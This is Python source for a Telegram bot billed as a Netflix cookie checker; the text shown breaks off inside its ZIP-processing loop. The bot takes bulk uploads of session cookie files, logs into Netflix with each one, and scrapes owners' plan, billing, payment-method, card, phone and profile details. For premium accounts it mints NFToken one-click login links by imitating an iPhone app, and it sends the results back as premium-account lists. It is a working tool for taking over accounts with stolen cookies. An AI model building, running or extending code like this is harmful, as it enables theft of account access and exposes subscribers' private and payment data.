import copy
import html
import json
import os
import random
import re
import shutil
import string
import sys
import time
import unicodedata
import zipfile
from datetime import datetime, timedelta, timezone
from io import BytesIO

import requests
from urllib3.exceptions import InsecureRequestWarning

# Telegram imports
try:
    from telegram import Update, BotCommand
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("Install: pip install python-telegram-bot==20.7")
    sys.exit(1)

try:
    import yaml
except ImportError:
    yaml = None

# ==================== READ BOT TOKEN ====================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN environment variable not set!")
    print("Please add BOT_TOKEN in Railway Environment Variables")
    sys.exit(1)

# ==================== CONFIGURATION ====================
DEFAULT_CONFIG = {
    "txt_fields": {
        "name": False, "email": False, "max_streams": True, "plan_price": True,
        "plan": True, "country": True, "member_since": False, "next_billing": True,
        "extra_members": True, "payment_method": True, "card": False, "phone": False,
        "quality": True, "hold_status": False, "email_verified": False,
        "membership_status": False, "profiles": True, "user_guid": False,
    },
    "nftoken": "both",
    "add_emojis": "webhook",
    "notifications": {
        "webhook": {"enabled": False, "url": "", "mode": "full", "plans": "all"},
        "telegram": {"enabled": False, "bot_token": "", "chat_id": "", "mode": "full", "plans": "all"},
    },
    "display": {"mode": "simple"},
    "retries": {"error_proxy_attempts": 3, "nftoken_attempts": 1},
    "performance": {
        "request_timeout_seconds": 15,
        "fallback_account_page": False,
        "retry_incomplete_info": False,
        "nftoken_for_free": False,
    },
}

DEFAULT_YAML_CONFIG = """# Netflix Checker Configuration
txt_fields:
  name: false
  email: false
  plan: true
  country: true
  member_since: false
  quality: true
  max_streams: true
  plan_price: true
  next_billing: true
  payment_method: true
  card: false
  phone: false
  hold_status: false
  extra_members: true
  email_verified: false
  membership_status: false
  profiles: true
  user_guid: false

nftoken: "both"
add_emojis: "webhook"

notifications:
  webhook:
    enabled: false
    url: ""
    mode: "full"
    plans: "all"
  telegram:
    enabled: false
    bot_token: ""
    chat_id: ""
    mode: "full"
    plans: "all"

display:
  mode: "simple"

retries:
  error_proxy_attempts: 3
  nftoken_attempts: 1

performance:
  request_timeout_seconds: 15
  fallback_account_page: false
  retry_incomplete_info: false
  nftoken_for_free: false
"""

APP_VERSION = "4.5.0"

# Folders
cookies_folder = "cookies"
output_folder = "output"
failed_folder = "failed"
broken_folder = "broken"
proxy_file = "proxy.txt"

# Bot stats
bot_application = None
stats = {"total": 0, "valid": 0, "free": 0, "failed": 0, "processing": 0}
user_tasks = {}

# NFToken API settings
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# ==================== HELPER FUNCTIONS ====================

def create_base_folders():
    for folder in [cookies_folder, output_folder, failed_folder, broken_folder]:
        os.makedirs(folder, exist_ok=True)
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# Add your proxies here\n")

def load_config():
    config_yaml_path = "config.yml"
    if os.path.exists(config_yaml_path):
        if yaml is None:
            return copy.deepcopy(DEFAULT_CONFIG), "default"
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config), config_yaml_path
        except Exception:
            with open(config_yaml_path, "w", encoding="utf-8") as f:
                f.write(DEFAULT_YAML_CONFIG)
            return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path
    with open(config_yaml_path, "w", encoding="utf-8") as f:
        f.write(DEFAULT_YAML_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path

def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged

def write_text_file_safely(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)

def decode_netflix_value(value):
    if value is None:
        return None
    return html.unescape(str(value)).strip()

def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            return decode_netflix_value(match.group(1))
    return None

def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    return cleaned.lower() in {"true", "yes", "1", "on"}

def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None


# ==================== COOKIE EXTRACTION FUNCTIONS ====================

def is_netflix_domain(domain):
    domain = str(domain or "").replace("#HttpOnly_", "").lower()
    return "netflix." in domain

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)

def canonicalize_netflix_cookie_name(name):
    return str(name or "").strip()

def is_netflix_cookie_entry(domain, name):
    return name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)

def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    return bool(cookie_dict.get("NetflixId"))

def convert_json_to_netscape(json_data):
    if isinstance(json_data, dict):
        if "cookies" in json_data:
            json_data = json_data["cookies"]
        elif "items" in json_data:
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return ""
    netscape_lines = []
    for cookie in json_data:
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = cookie.get("name", "")
        if not is_netflix_cookie_entry(domain, name):
            continue
        tail_match = "TRUE" if domain.startswith(".") else "FALSE"
        path = cookie.get("path", "/")
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
        value = cookie.get("value", "")
        netscape_lines.append(f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}")
    return "\n".join(netscape_lines)

def split_netscape_cookie_columns(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return []
    if line.startswith("#HttpOnly_"):
        line = line[10:]
    parts = line.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", line, 6)
    return parts if len(parts) >= 7 else []

def is_netscape_cookie_line(line):
    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
        return False
    return True

def extract_netscape_cookie_entries(raw_text):
    entries = []
    for idx, line in enumerate(raw_text.splitlines()):
        if not is_netscape_cookie_line(line):
            continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7:
            continue
        domain, tail, path, secure, expires, name, value = parts
        if is_netflix_cookie_entry(domain, name):
            entries.append({
                "domain": domain, "tail_match": tail, "path": path,
                "secure": secure, "expires": expires, "name": name,
                "value": value, "position": idx
            })
    return entries

def extract_json_cookie_entries(content):
    try:
        data = json.loads(content)
    except:
        return []
    if isinstance(data, dict):
        if "cookies" in data:
            data = data["cookies"]
        elif "items" in data:
            data = data["items"]
        else:
            data = [data]
    if not isinstance(data, list):
        return []
    entries = []
    for idx, cookie in enumerate(data):
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = cookie.get("name", "")
        if not is_netflix_cookie_entry(domain, name):
            continue
        tail = "TRUE" if domain.startswith(".") else "FALSE"
        path = cookie.get("path", "/")
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
        value = cookie.get("value", "")
        entries.append({
            "domain": domain, "tail_match": tail, "path": path,
            "secure": secure, "expires": expires, "name": name,
            "value": value, "position": idx
        })
    return entries

def extract_raw_cookie_entries(raw_text):
    entries = []
    for idx, match in enumerate(re.finditer(r"(NetflixId|SecureNetflixId|nfvdid)\s*[:=]\s*([^\s;,\"]+)", raw_text, re.I)):
        name = match.group(1)
        value = match.group(2).strip("\"'")
        entries.append({
            "domain": ".netflix.com", "tail_match": "TRUE", "path": "/",
            "secure": "TRUE", "expires": "0", "name": name,
            "value": value, "position": idx
        })
    return entries

def build_cookie_bundles_from_entries(entries):
    if not entries:
        return []
    by_name = {}
    for e in entries:
        by_name.setdefault(e["name"], []).append(e)
    bundle_count = max(len(v) for v in by_name.values())
    bundles = []
    for i in range(bundle_count):
        selected = []
        for name, lst in by_name.items():
            if i < len(lst):
                selected.append(lst[i])
            elif len(lst) == 1:
                selected.append(lst[0])
        selected.sort(key=lambda x: x.get("position", 0))
        netscape = "\n".join(
            f"{e['domain']}\t{e['tail_match']}\t{e['path']}\t{e['secure']}\t{e['expires']}\t{e['name']}\t{e['value']}"
            for e in selected
        )
        cookies = {e["name"]: e["value"] for e in selected}
        bundles.append({"netscape_text": netscape, "cookies": cookies})
    return bundles

def extract_netflix_cookie_bundles(content):
    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
        bundles = build_cookie_bundles_from_entries(extractor(content))
        if bundles:
            return bundles
    return []

def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = split_netscape_cookie_columns(line)
        if len(parts) >= 7:
            domain, _, _, _, _, name, value = parts
            if is_netflix_cookie_entry(domain, name):
                cookies[name] = value
    return cookies


# ==================== ACCOUNT INFO EXTRACTION ====================

def extract_profile_names(response_text):
    names = []
    for pattern in [r'"profileName"\s*:\s*"([^"]+)"']:
        for match in re.finditer(pattern, response_text):
            name = decode_netflix_value(match.group(1))
            if name and name not in names:
                names.append(name)
    return ", ".join(names) if names else None

def extract_info_from_graphql_payload(response_text):
    try:
        data = json.loads(response_text).get("data", {})
        ga = data.get("growthAccount", {})
        cp = data.get("currentProfile", {})
        cur_plan = ga.get("currentPlan", {}).get("plan", {})
        info = {
            "accountOwnerName": decode_netflix_value(cp.get("name")),
            "countryOfSignup": decode_netflix_value(ga.get("countryOfSignUp", {}).get("code")),
            "memberSince": decode_netflix_value(ga.get("memberSince")),
            "nextBillingDate": decode_netflix_value(ga.get("nextBillingDate", {}).get("localDate")),
            "userGuid": decode_netflix_value(ga.get("ownerGuid")),
            "membershipStatus": decode_netflix_value(ga.get("membershipStatus")),
            "localizedPlanName": decode_netflix_value(cur_plan.get("name")),
            "planPrice": decode_netflix_value(cur_plan.get("priceDisplay")),
            "videoQuality": decode_netflix_value(cur_plan.get("videoQuality")),
            "maxStreams": cur_plan.get("maxStreams"),
            "profiles": None,
        }
        profiles = ga.get("profiles", [])
        profile_names = [decode_netflix_value(p.get("name")) for p in profiles if p.get("name")]
        if profile_names:
            info["profiles"] = ", ".join(profile_names)
        return {k: v for k, v in info.items() if v}
    except:
        return {}

def has_complete_account_info(info):
    if not info:
        return False
    required = ("countryOfSignup", "membershipStatus", "localizedPlanName")
    return all(info.get(f) for f in required)

def merge_info(primary, fallback):
    merged = dict(fallback or {})
    for k, v in (primary or {}).items():
        if v not in (None, "", [], {}):
            merged[k] = v
    return merged

def extract_info(response_text):
    graphql_info = extract_info_from_graphql_payload(response_text)
    if has_complete_account_info(graphql_info):
        return graphql_info
    extracted = {
        "accountOwnerName": extract_first_match(response_text, [r'"name":"([^"]+)"', r'"accountOwnerName":"([^"]+)"']),
        "countryOfSignup": extract_first_match(response_text, [r'"currentCountry":"([^"]+)"', r'"countryOfSignup":"([^"]+)"']),
        "memberSince": extract_first_match(response_text, [r'"memberSince":"([^"]+)"']),
        "nextBillingDate": extract_first_match(response_text, [r'"nextBillingDate":"([^"]+)"']),
        "userGuid": extract_first_match(response_text, [r'"userGuid":"([^"]+)"']),
        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":"([^"]+)"']),
        "maxStreams": extract_first_match(response_text, [r'"maxStreams":(\d+)']),
        "localizedPlanName": extract_first_match(response_text, [r'"localizedPlanName":"([^"]+)"', r'"planName":"([^"]+)"']),
        "planPrice": extract_first_match(response_text, [r'"planPrice":"([^"]+)"', r'"formattedPlanPrice":"([^"]+)"']),
        "videoQuality": extract_first_match(response_text, [r'"videoQuality":"([^"]+)"']),
        "profiles": extract_profile_names(response_text),
    }
    return merge_info(graphql_info, extracted)

def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    return re.sub(r"[^\w]+", "_", plan_name.lower()).strip("_")

def get_canonical_output_label(plan_key):
    labels = {"premium": "Premium", "standard": "Standard", "basic": "Basic", "free": "Free"}
    return labels.get(plan_key, "Unknown")

def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    if not is_subscribed and not raw_plan:
        return "free", "Free"
    norm = normalize_plan_key(raw_plan) if raw_plan else ""
    if norm in ("premium", "premium_plan"):
        return "premium", "Premium"
    if norm in ("standard", "estandar"):
        return "standard", "Standard"
    if norm in ("basic", "basico"):
        return "basic", "Basic"
    streams = info.get("maxStreams")
    if streams:
        try:
            streams = int(str(streams))
            if streams >= 4:
                return "premium", "Premium"
            if streams >= 2:
                return "standard", "Standard"
        except:
            pass
    return "unknown", "Unknown"

def is_subscribed_account(info):
    status = normalize_plan_key(info.get("membershipStatus"))
    return status == "current_member"

def is_extra_member_account(info):
    return "extra" in str(info.get("localizedPlanName", "")).lower()

def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %d, %Y")
    except:
        pass
    return cleaned

def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %Y")
    except:
        pass
    return cleaned

def country_code_to_flag(country_code):
    raw = decode_netflix_value(country_code) or ""
    if len(raw) == 2 and raw.isalpha():
        return "".join(chr(127397 + ord(c)) for c in raw.upper())
    return ""

def format_country_with_flag(country_value):
    country = decode_netflix_value(country_value) or "Unknown"
    flag = country_code_to_flag(country)
    return f"{country} {flag}".strip()

def get_nftoken_mode(config):
    val = config.get("nftoken", "both")
    if isinstance(val, bool):
        return "both" if val else "false"
    return str(val).lower()

def has_usable_nftoken(data):
    return data and data.get("token")

def create_nftoken(cookie_dict, attempts=1):
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        resp = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=30, verify=False)
        if resp.status_code != 200:
            return None, f"HTTP {resp.status_code}"
        data = resp.json()
        token_data = data.get("value", {}).get("account", {}).get("token", {}).get("default", {})
        token = token_data.get("token")
        if token:
            expiry = (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")
            return {"token": token, "expires_at_utc": expiry}, None
    except:
        pass
    return None, "Failed"

def build_nftoken_links(token, mode):
    if not token or mode == "false":
        return []
    if mode == "pc":
        return [("PC Login", f"https://netflix.com/?nftoken={token}")]
    if mode == "mobile":
        return [("Phone Login", f"https://netflix.com/unsupported?nftoken={token}")]
    return [
        ("PC Login", f"https://netflix.com/?nftoken={token}"),
        ("Phone Login", f"https://netflix.com/unsupported?nftoken={token}"),
    ]

def get_account_page(session, proxy=None, timeout=15):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    resp = session.get("https://www.netflix.com/YourAccount", headers=headers, timeout=timeout)
    if resp.status_code == 200:
        return resp.text, resp.status_code, extract_info(resp.text)
    return resp.text, resp.status_code, None


# ==================== RESULT FORMATTING ====================

def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename, nftoken_data=None, config=None):
    if config is None:
        config, _ = load_config()
    
    _, plan_label = derive_plan_info(info, is_subscribed)
    status = "Valid Premium Account" if is_subscribed else "Valid Free Account"
    
    name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
    email = decode_netflix_value(info.get("email")) or "Unknown"
    country = format_country_with_flag(info.get("countryOfSignup"))
    plan = plan_label
    price = decode_netflix_value(info.get("planPrice")) or "N/A"
    member_since = format_member_since(info.get("memberSince")) or "Unknown"
    next_billing = format_display_date(info.get("nextBillingDate")) or "Unknown"
    payment = decode_netflix_value(info.get("paymentMethodType")) or "Unknown"
    card = decode_netflix_value(info.get("maskedCard")) or "N/A"
    phone = decode_netflix_value(info.get("phoneNumber")) or "N/A"
    phone_verified = "Yes" if format_boolean_label(info.get("phoneVerified")) else "No"
    quality = decode_netflix_value(info.get("videoQuality")) or "Unknown"
    streams = str(info.get("maxStreams") or "Unknown").rstrip("}")
    hold = "No"
    extra_member = "Yes" if is_extra_member_account(info) else "No"
    email_verified = "Yes" if format_boolean_label(info.get("emailVerified")) else "No"
    membership_status = decode_netflix_value(info.get("membershipStatus")) or "Unknown"
    profiles_count = len(info.get("profiles", "").split(", ")) if info.get("profiles") else 0
    profiles = decode_netflix_value(info.get("profiles")) or "None"
    
    lines = []
    lines.append("=" * 65)
    lines.append(f"STATUS: {status}")
    lines.append("=" * 65)
    lines.append("")
    lines.append("ACCOUNT DETAILS")
    lines.append("-" * 40)
    lines.append(f"Name: {name}")
    lines.append(f"Email: {email}")
    lines.append(f"Country: {country}")
    lines.append(f"Plan: {plan}")
    
    if is_subscribed:
        if price != "N/A":
            lines.append(f"Price: {price}")
        lines.append(f"Member Since: {member_since}")
        lines.append(f"Next Billing: {next_billing}")
        lines.append(f"Payment: {payment}")
        if payment.upper() == "CC" and card != "N/A":
            lines.append(f"Card: {card}")
        lines.append(f"Phone: {phone} ({phone_verified})")
        lines.append(f"Quality: {quality}")
        lines.append(f"Streams: {streams}")
        lines.append(f"Hold Status: {hold}")
        lines.append(f"Extra Member: {extra_member}")
        lines.append(f"Email Verified: {email_verified}")
        lines.append(f"Membership Status: {membership_status}")
    else:
        lines.append(f"Email Verified: {email_verified}")
    
    lines.append("")
    lines.append("PROFILES")
    lines.append("-" * 40)
    lines.append(f"Connected Profiles: {profiles_count}")
    lines.append(f"Profiles: {profiles}")
    
    lines.append("")
    lines.append("COOKIE")
    lines.append("-" * 40)
    cookie_clean = cookie_content.replace('\n', '').replace('\r', '')
    cookie_clean = re.sub(r'\s+', '', cookie_clean)
    lines.append(cookie_clean)
    
    lines.append("")
    lines.append("FILTERS")
    lines.append("-" * 40)
    lines.append("Account Filter: Premium Only")
    lines.append("Mode: Full Information")
    
    if is_subscribed and nftoken_data and has_usable_nftoken(nftoken_data):
        lines.append("")
        lines.append("NFTOKEN LOGIN LINKS")
        lines.append("-" * 40)
        mode = get_nftoken_mode(config)
        for label, link in build_nftoken_links(nftoken_data["token"], mode):
            lines.append(f"{label}:")
            lines.append(link)
            lines.append("")
        lines.append(f"Valid Until: {nftoken_data['expires_at_utc']}")
    
    lines.append("")
    lines.append("=" * 65)
    
    return "\n".join(lines)


# ==================== PROGRESS BAR FUNCTIONS ====================

def format_progress_message(processed, total, valid_count, premium_count, free_count, invalid_count, speed, eta):
    percentage = (processed / total) * 100 if total > 0 else 0
    filled = int(20 * percentage / 100)
    empty = 20 - filled
    bar = "█" * filled + "░" * empty
    
    message = f"""📦 Processing Progress

Total Cookies: {total}
Mode: Fullinfo
Filter: Premium accounts only

📊 Current Status:
{percentage:.1f}% {bar}

📁 Processing: {processed}/{total}
✅ Valid: {valid_count}
💰 Premium: {premium_count}
🆓 Free: {free_count}
❌ Invalid: {invalid_count}

⚡ Speed: {speed:.1f} acc/s
⏱️ ETA: {eta:.1f}s remaining

⚠️ Use /cancel to stop this task"""
    return message


# ==================== TELEGRAM BOT HANDLERS ====================

async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    first_name = user.first_name if user.first_name else "User"
    
    await update.message.reply_text(f"""
🎬 Netflix Cookie Checker Bot
⚡ Developer: Eyad 🚀

✨ Welcome {first_name}! ✨

📌 WHAT I DO:
   ✅ Verify Netflix cookies
   ✅ Extract premium account details

⚙️ HOW TO USE:
   1️⃣ Export cookies (.txt or .json)
   2️⃣ Send files directly (single or ZIP)
   3️⃣ Watch progress bar
   4️⃣ Receive PREMIUM_ACCOUNTS.txt

🕹️ COMMANDS:
   /start      → Show menu
   /help       → Instructions
   /stats      → Statistics
   /tokenonly  → Token-only mode
   /fullinfo   → Full details mode
   /cancel     → Stop current task

🔽 USE THE MENU BUTTON BELOW FOR COMMANDS
""")

async def bot_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
📖 HELP & INSTRUCTIONS

STEP 1: Export Cookies
   - EditThisCookie
   - Cookie-Editor
   - Get cookies.txt

STEP 2: Send Files
   - Send single .txt or .json
   - OR send ZIP with multiple files

STEP 3: Get Results
   - PREMIUM_ACCOUNTS.txt file
   - Full account details
   - NFToken login links

🔽 USE THE MENU BUTTON FOR COMMANDS
""")

async def bot_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"""
📊 BOT STATISTICS

Total files processed: {stats['total']}
✅ Valid Premium accounts: {stats['valid']}
🆓 Free accounts: {stats['free']}
❌ Failed/Invalid: {stats['failed']}
🔄 Currently processing: {stats['processing']}

🤖 Bot is running normally
""")

async def bot_tokenonly(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['mode'] = 'tokenonly'
    await update.message.reply_text("🔑 Token Only Mode - ACTIVATED")

async def bot_fullinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['mode'] = 'fullinfo'
    await update.message.reply_text("📋 Full Info Mode - ACTIVATED")

async def bot_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in user_tasks and user_tasks[uid].get('active'):
        user_tasks[uid]['cancel'] = True
        await update.message.reply_text("⏹️ Cancellation requested - Task will stop after current file")
    else:
        await update.message.reply_text("ℹ️ No active task to cancel")

async def handle_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user_tasks[uid] = {'active': True, 'cancel': False}
    doc = update.message.document
    fname = doc.file_name
    
    if doc.file_size > 5 * 1024 * 1024:
        await update.message.reply_text("❌ File too large! Max 5MB. Use ZIP for larger collections.")
        user_tasks[uid]['active'] = False
        return
    
    msg = await update.message.reply_text(f"📥 Processing: {fname}\n\nPlease wait...")
    file = await doc.get_file()
    data = BytesIO()
    await file.download_to_memory(data)
    content = data.getvalue().decode('utf-8', errors='ignore')
    
    bundles = extract_netflix_cookie_bundles(content)
    
    if not bundles:
        await msg.edit_text("❌ No valid cookies found")
        stats['failed'] += 1
        user_tasks[uid]['active'] = False
        return
    
    cookies = bundles[0].get("cookies", {})
    if not has_required_netflix_cookies(cookies):
        await msg.edit_text("❌ Missing NetflixId cookie")
        stats['failed'] += 1
        user_tasks[uid]['active'] = False
        return
    
    await msg.edit_text("🔄 Connecting to Netflix...")
    session = requests.Session()
    session.cookies.update(cookies)
    resp, code, info = get_account_page(session, None, 15)
    
    if code == 200 and info and info.get("countryOfSignup"):
        is_sub = is_subscribed_account(info)
        config, _ = load_config()
        nftoken = None
        if get_nftoken_mode(config) != "false" and is_sub:
            nftoken, _ = create_nftoken(cookies, 1)
        
        mode = context.user_data.get('mode', 'fullinfo')
        if mode == 'tokenonly':
            email = info.get("email", "Unknown")
            res = f"Account: {email}\n\nNFToken Login Links:\n---\nPC Login: https://netflix.com/?nftoken={nftoken['token']}\nPhone Login: https://netflix.com/unsupported?nftoken={nftoken['token']}"
        else:
            res = format_result_beautiful(info, is_sub, bundles[0].get("netscape_text", ""), fname, nftoken, config)
        
        await msg.delete()
        buf = BytesIO()
        buf.write(res.encode('utf-8'))
        buf.seek(0)
        typ = "Premium" if is_sub else "Free"
        await update.message.reply_document(document=buf, filename=f"{typ}_{int(time.time())}.txt", caption="✅ Account Check Result")
        stats['valid'] += 1 if is_sub else 0
        stats['free'] += 0 if is_sub else 1
    else:
        await msg.edit_text(f"❌ Failed: HTTP {code}")
        stats['failed'] += 1
    
    stats['total'] += 1
    user_tasks[uid]['active'] = False

async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats
    uid = update.effective_user.id
    user_tasks[uid] = {'active': True, 'cancel': False}
    doc = update.message.document
    fname = doc.file_name
    start = time.time()
    
    if doc.file_size > 100 * 1024 * 1024:
        await update.message.reply_text("❌ File too large! Max 100MB")
        user_tasks[uid]['active'] = False
        return
    
    msg = await update.message.reply_text(f"📦 Processing ZIP: {fname}\n\nPlease wait...")
    file = await doc.get_file()
    zip_data = BytesIO()
    await file.download_to_memory(zip_data)
    
    premium_accounts = []
    free_count = 0
    invalid_count = 0
    total_files = 0
    processed = 0
    
    try:
        with zipfile.ZipFile(zip_data, 'r') as zf:
            files = [f for f in zf.namelist() if f.endswith(('.txt', '.json'))]
            total_files = len(files)
            if not files:
                await msg.edit_text("❌ No cookie files found in ZIP")
                user_tasks[uid]['active'] = False
                return
            
            config, _ = load_config()
            mode = context.user_data.get('mode', 'fullinfo')
            
            for idx, cf in enumerate(files):
                if user_tasks[uid].get('cancel', False):
                    await msg.edit_text("⏹️ Task cancelled by user")
                    break
                
                try:
                    content = zf.read(cf).decode('utf-8', errors='ignore')
                    bundles = extract_netflix_cookie_bundles(content)
                    
                    premium_count = len([r for r in premium_accounts if r.startswith(("=", "STATUS:", "Account:"))])
                    elapsed = time.time() - start
                    speed = processed / elapsed if elapsed > 0 else 0
                    remaining = total_files - processed
                    eta = remaining / speed if speed > 0 else 0
                    
                    progress_msg = format_progress_message(
                        processed, total_files, 
                        stats['valid'], premium_count, free_count, 
                        invalid_count, speed, eta
                    )
                    await msg.edit_text(progress_msg)
                    
                    if bundles:
                        cookies = bundles[0].get("cookies", {})
                        if has_required_netflix_cookies(cookies):
                            sess = requests.Session()
                            sess.cookies.update(cookies)
